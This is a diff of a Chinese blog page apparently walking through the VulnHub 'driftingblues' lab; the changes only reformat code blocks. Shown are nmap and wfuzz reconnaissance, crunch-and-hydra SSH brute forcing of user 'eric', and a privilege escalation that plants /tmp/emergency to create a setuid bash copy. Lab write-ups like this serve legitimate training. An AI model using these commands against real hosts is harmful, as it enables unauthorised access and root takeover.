@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="信息收集主机探测1arp-scan -l   端口扫描1nmap -sC -sV -p- 192.168.62.172   只开放了22和80端口，只能先访问80端口看一下有没有什么信息  好像没什么东西，扫了目录也没什么信息  右键查看源码，看到了一串疑似base64编码的字符串，到在线网站上转换一下，这应该是一个路径  访问一下，这个很明显了，到在线的ook!解密网站解密一下  是一个提示，应">
+    <meta name="description" content="信息收集主机探测arp-scan -l   端口扫描nmap -sC -sV -p- 192.168.62.172   只开放了22和80端口，只能先访问80端口看一下有没有什么信息  好像没什么东西，扫了目录也没什么信息  右键查看源码，看到了一串疑似base64编码的字符串，到在线网站上转换一下，这应该是一个路径  访问一下，这个很明显了，到在线的ook!解密网站解密一下  是一个提示，应该是">
 <meta property="og:type" content="article">
 <meta property="og:title" content="driftingblues VulnHub Walkthrough">
 <meta property="og:url" content="http://example.com/2021/10/12/driftingblues-VulnHub-Walkthrough/index.html">
 <meta property="og:site_name" content="colind0pe&#39;s blog">
-<meta property="og:description" content="信息收集主机探测1arp-scan -l   端口扫描1nmap -sC -sV -p- 192.168.62.172   只开放了22和80端口，只能先访问80端口看一下有没有什么信息  好像没什么东西，扫了目录也没什么信息  右键查看源码，看到了一串疑似base64编码的字符串，到在线网站上转换一下，这应该是一个路径  访问一下，这个很明显了，到在线的ook!解密网站解密一下  是一个提示，应">
+<meta property="og:description" content="信息收集主机探测arp-scan -l   端口扫描nmap -sC -sV -p- 192.168.62.172   只开放了22和80端口，只能先访问80端口看一下有没有什么信息  好像没什么东西，扫了目录也没什么信息  右键查看源码，看到了一串疑似base64编码的字符串，到在线网站上转换一下，这应该是一个路径  访问一下，这个很明显了，到在线的ook!解密网站解密一下  是一个提示，应该是">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://i.loli.net/2021/10/12/OmNE8evaC2VQzZc.png">
 <meta property="og:image" content="https://i.loli.net/2021/10/12/9LTWKF2Irw3bBn4.png">
@@ -183,11 +183,11 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-
+    <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h4><pre><code>arp-scan -l
+</code></pre>
 <p><img src="https://i.loli.net/2021/10/12/OmNE8evaC2VQzZc.png"></p>
-<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.62.172</span><br></pre></td></tr></table></figure>
-
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><pre><code>nmap -sC -sV -p- 192.168.62.172
+</code></pre>
 <p><img src="https://i.loli.net/2021/10/12/9LTWKF2Irw3bBn4.png"></p>
 <p>只开放了22和80端口，只能先访问80端口看一下有没有什么信息</p>
 <p><img src="https://i.loli.net/2021/10/12/3aTXBh7Au61snxe.png"></p>
@@ -203,8 +203,8 @@
 <p><img src="https://i.loli.net/2021/10/12/yrY1VEOUn7ZNJuf.png"></p>
 <p><img src="https://i.loli.net/2021/10/12/m8XTnM4pqJRSxYI.png"></p>
 <p>重新扫目录还是没有发现，那就试试爆破子域名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -u driftingblues.box -w /home/colin/文档/fuzzDicts/subdomainDicts/main.txt -H &quot;Host:FUZZ.driftingblues.box&quot; --hw 570</span><br></pre></td></tr></table></figure>
-
+<pre><code>wfuzz -u driftingblues.box -w /home/colin/文档/fuzzDicts/subdomainDicts/main.txt -H &quot;Host:FUZZ.driftingblues.box&quot; --hw 570
+</code></pre>
 <p><img src="https://i.loli.net/2021/10/12/IhLMdEA75BqWY8J.png"></p>
 <p>直接访问解析不了，需要再修改一下host</p>
 <p><img src="https://i.loli.net/2021/10/12/9HeMXPp4nxUc5T3.png"></p>
@@ -217,28 +217,33 @@
 <p>查看ssh_cred.txt，给了提示</p>
 <p><img src="https://i.loli.net/2021/10/12/lO2CwcisZyFhX7Q.png"></p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>ssh登录的密码是<code>1mw4ckyyucky*</code>，目前还缺一位数字，一共十个可能的密码，先生成一下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 13 13 -t 1mw4ckyyucky% &gt; pass</span><br></pre></td></tr></table></figure>
-
+<pre><code>crunch 13 13 -t 1mw4ckyyucky% &gt; pass
+</code></pre>
 <p>看一下我们生成的密码集合</p>
 <p><img src="https://i.loli.net/2021/10/12/LKM18PeBjnQ3EmN.png"></p>
 <p>接下来尝试爆破ssh登录密码，根据前面访问<code>test.driftingblues.box</code>的提示，用户名应该是<code>eric</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l eric -P pass ssh://192.168.62.172</span><br></pre></td></tr></table></figure>
-
+<pre><code>hydra -l eric -P pass ssh://192.168.62.172
+</code></pre>
 <p><img src="https://i.loli.net/2021/10/12/DEn1wX8sbvx3KPy.png"></p>
 <p>找到密码了，直接登录ssh</p>
 <p><img src="https://i.loli.net/2021/10/12/tR6dFViCTaYM3gk.png"></p>
 <p>直接获取第一个flag</p>
 <img src="https://i.loli.net/2021/10/12/R6CWvfVqErO29Az.png" style="zoom:67%;" />
 
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">getcap -r  / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><pre><code>uname -a
+find / -perm -u=s -type f 2&gt;/dev/null
+getcap -r  / 2&gt;/dev/null
+</code></pre>
 <p>看了一遍都没有什么发现，只能看一看有没有什么其他可以利用的地方</p>
 <p>在备份目录下有个backup.sh，看一下内容</p>
 <p><img src="https://i.loli.net/2021/10/12/y8jaFm2eGTYUiXo.png"></p>
 <p>有一个sudo执行的/tmp/emergency，但是tmp目录下是没有这个文件的，所以应该通过新建文件来提权</p>
 <p>思路是这样，但还是不知道怎么操作，只能看看别人的walkthrough了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;cp /bin/bash /tmp/getroot; chmod +s /tmp/getroot&#x27; &gt; /tmp/emergency</span><br><span class="line">#系统执行backup.up，以sudo执行emergency，会将/bin/bash复制到tmp，并赋予执行权限</span><br><span class="line">chmod +x emergency</span><br><span class="line">./getroot -p</span><br></pre></td></tr></table></figure>
-
+<pre><code>echo &#39;cp /bin/bash /tmp/getroot; chmod +s /tmp/getroot&#39; &gt; /tmp/emergency
+#系统执行backup.up，以sudo执行emergency，会将/bin/bash复制到tmp，并赋予执行权限
+chmod +x emergency
+./getroot -p
+</code></pre>
 <p><img src="https://i.loli.net/2021/10/12/jWGusDP8aTNwCgS.png"></p>
 <p><img src="https://i.loli.net/2021/10/12/lRnyG9txiQKuYW5.png"></p>
 <p>现在可以获取第二个flag了</p>
